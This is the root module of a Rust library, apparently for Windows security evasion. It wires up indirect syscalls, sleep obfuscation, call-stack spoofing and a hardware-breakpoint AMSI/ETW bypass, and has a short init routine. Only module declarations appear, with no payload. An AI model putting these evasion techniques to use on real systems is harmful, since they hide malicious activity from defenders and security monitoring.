//!
//!
//! ```ignore
//! let status = unsafe { libra_syscalls::nt_delay_execution(0, &mut delay) };
//! ```
//!

pub mod types;

#[cfg(windows)]
mod extract;
#[cfg(windows)]
mod ffi;
#[cfg(windows)]
mod hwbp;
#[cfg(windows)]
mod invoke;
#[cfg(windows)]
mod pe;
#[cfg(windows)]
mod sleepobf;
#[cfg(windows)]
mod spoof;
#[cfg(windows)]
mod stub;
#[cfg(windows)]
mod table;

#[cfg(windows)]
pub use extract::{probe_stub, StubProbe};
#[cfg(windows)]
pub use hwbp::install_amsi_etw_bypass;
#[cfg(windows)]
pub use invoke::*;
#[cfg(windows)]
pub use sleepobf::{obfuscated_sleep, Context};
#[cfg(windows)]
pub use spoof::{init_spoof, spoof_call, SpoofFrame};
#[cfg(windows)]
pub use table::SyscallTable;
pub use types::*;

///
#[cfg(windows)]
pub fn init() -> Result<(), &'static str> {
    let table = SyscallTable::build()?;
    if table.trampoline == 0 {
        return Err("no syscall trampoline found");
    }
    stub::write_ssn(&table)?;
    stub::LIBRA_TRAMPOLINE.store(
        table.trampoline as u64,
        core::sync::atomic::Ordering::Relaxed,
    );
    let _ = spoof::init_spoof();
    Ok(())
}

#[cfg(not(windows))]
pub fn init() -> Result<(), &'static str> {
    Ok(())
}
